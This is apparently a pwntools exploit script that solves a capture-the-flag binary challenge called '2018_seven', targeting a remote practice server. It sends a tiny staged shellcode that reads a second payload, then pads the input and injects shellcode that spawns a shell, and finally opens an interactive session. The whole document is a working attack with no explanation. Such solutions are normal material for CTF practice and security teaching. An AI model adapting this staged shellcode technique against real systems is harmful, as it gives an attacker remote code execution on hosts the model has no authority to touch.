'''
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    exp: shellcode execution
'''

from pwn import *


local = 0
url, port = "node5.buuoj.cn", 28571 
filename = "./2018_seven"
elf = ELF(filename)
# libc = ELF("")
context(arch="amd64", os="linux")
# context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    # context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)

def B():
    gdb.attach(io)
    pause()

def pwn():
    shellcode = asm('push rsp;pop rsi;mov dx,si;syscall')
    io.sendafter(b'shellcode:\n', shellcode)
    sleep(0.233)
    payload = cyclic(0xb37) + asm(shellcraft.sh())
    io.sendline(payload)


if __name__ == "__main__":
    pwn()
    io.interactive()
